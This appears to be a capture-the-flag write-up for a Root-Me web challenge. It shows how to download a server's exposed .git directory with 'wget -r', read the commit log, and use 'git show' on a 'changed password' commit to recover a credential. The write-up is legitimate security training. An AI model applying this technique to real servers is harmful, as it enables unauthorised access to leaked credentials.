# 🧩Challenge : Insecure Code Management

# 🔍 Description
- In this challenge, we explore an insecure Git repository that has been accidentally exposed on the server. By retrieving the hidden ``.git`` directory, we can access the commit history and extract sensitive information that should never have been stored in version control, such as passwords and hashed credentials.

# ⚙️ Exploitation
- The first step is to download file with wget:

``wget -r http://challenge01.root-me.org/web-serveur/ch61/.git/ ``

-  When we are inside the .git directory, we can run git log to view the commit history and see all the changes that were made over time.
````
$ git log
commit c0b4661c888bd1ca0f12a3c080e4d2597382277b (HEAD -> master)
Author: John <john@bs-corp.com>
Date:   Fri Sep 27 20:10:05 2019 +0200

   blue team want sha256!!!!!!!!!

commit 550880c40814a9d0c39ad3485f7620b1dbce0de8
Author: John <john@bs-corp.com>
Date:   Mon Sep 23 15:10:07 2019 +0200

   renamed app name

commit a8673b295eca6a4fa820706d5f809f1a8b49fcba
Author: John <john@bs-corp.com>
Date:   Sun Sep 22 12:38:32 2019 +0200

   changed password

commit 1572c85d624a10be0aa7b995289359cc4c0d53da
Author: John <john@bs-corp.com>
Date:   Thu Sep 12 11:10:06 2019 +0200
````

- We found an interesting commit, so we use git show to display the changes introduced in that specific commit.

``git show a8673b295eca6a4fa820706d5f809f1a8b49fcba``

- And we have the password